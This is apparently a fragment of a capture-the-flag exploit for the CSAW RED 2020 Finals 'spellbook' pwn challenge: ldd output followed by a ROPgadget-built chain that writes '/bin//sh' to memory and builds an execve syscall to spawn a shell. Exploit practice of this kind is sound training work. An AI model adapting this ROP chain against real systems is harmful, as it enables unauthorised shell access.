ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ ldd spellbook
    linux-vdso.so.1 (0x00007ffc1bb71000)
    /home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so (0x00007f97f9840000)
    /home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/ld-2.24.so => /lib64/ld-linux-x86-64.so.2 (0x00007f97f9de4000)


ROPGadget ROP chain:
    p += pack('<Q', 0x0000000000001b96) # pop rdx ; ret
    p += pack('<Q', 0x00000000003eb1a0) # @ .data
    p += pack('<Q', 0x0000000000043a78) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x00000000000309cc) # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', 0x0000000000001b96) # pop rdx ; ret
    p += pack('<Q', 0x00000000003eb1a8) # @ .data + 8
    p += pack('<Q', 0x00000000000b1835) # xor rax, rax ; ret
    p += pack('<Q', 0x00000000000309cc) # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', 0x000000000002155f) # pop rdi ; ret
    p += pack('<Q', 0x00000000003eb1a0) # @ .data
    p += pack('<Q', 0x0000000000023e8a) # pop rsi ; ret
    p += pack('<Q', 0x00000000003eb1a8) # @ .data + 8
    p += pack('<Q', 0x0000000000001b96) # pop rdx ; ret
    p += pack('<Q', 0x00000000003eb1a8) # @ .data + 8
    p += pack('<Q', 0x00000000000b1835) # xor rax, rax ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000d0e60) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000000013c0) # syscall
'''
